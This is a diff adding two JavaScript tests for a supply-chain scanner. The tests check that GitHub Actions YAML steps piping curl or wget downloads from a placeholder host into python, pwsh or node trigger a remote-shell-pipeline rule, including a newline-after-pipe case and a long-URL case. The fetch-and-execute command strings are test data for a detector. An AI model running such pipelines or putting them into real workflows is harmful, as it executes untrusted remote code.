@@ -1017,3 +1017,24 @@ test('Codex P1: heuristic supply chain review flags Python and PowerShell downlo
   assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({interpreter,result}));
  }
 });
+
+test('ROOT-8: supply-chain heuristic detects Bash newline after pipe',()=>{
+ const examples=[
+  ['curl https://example.invalid/payload |','  python'],
+  ['curl https://example.invalid/payload |&','  pwsh'],
+  ['wget -qO- https://example.invalid/payload |','  node']
+ ];
+ for(const code of examples){
+  const y=['on: push','jobs:','  test:','    steps:','      - run: |',...code.map(s=>'          '+s)].join('\n');
+  const result=scan(y);
+  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({code,result}));
+ }
+});
+test('ROOT-8: supply-chain heuristic detects download pipeline after 240 chars',()=>{
+ for(const count of [241,512,2048]){
+  const y=['on: push','jobs:','  test:','    steps:',
+   '      - run: curl https://example.invalid/'+('z'.repeat(count))+' | python'].join('\n');
+  const result=scan(y);
+  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({count,result}));
+ }
+});
